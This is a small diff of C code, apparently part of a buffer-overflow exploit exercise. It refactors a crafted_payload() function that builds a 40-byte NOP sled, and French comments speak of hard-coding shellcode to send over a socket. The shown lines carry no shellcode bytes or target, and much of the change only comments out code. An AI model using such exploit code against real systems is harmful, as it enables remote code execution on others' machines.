@@ -10,7 +10,7 @@
 
 size_t pay_size;
 
-char* crafted_payload(){
+const char* crafted_payload(){
 
 	// Serie de NOP
 	int nb_nop = 40;
@@ -72,16 +72,23 @@ long l=get_sp();
 printf("Ox%lu\n", l);
 */
 
+
 int main (int argc, char *argv[]){
 
 	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
 
-	//crafted_payload();
 	//printf("%li\n", pay_size);
-	char payload[pay_size];
-	//printf("%li\n", sizeof(payload));
-	//memset(payload, crafted_payload(), pay_size);
+	/*char payload[pay_size];
+	const char *str = crafted_payload();
+	size_t len = strlen(str);
+	printf("%li\n", sizeof(payload));
+	memset(payload, 0, sizeof(payload));
+	memcpy(payload, str, len);*/
 	//snprintf(payload, pay_size, crafted_payload());
+
+
+	const char* payload = crafted_payload();
+
 	
     // Ecriture en dur du shellcode : 
     // NOP *40(etc 1 octet chaque)
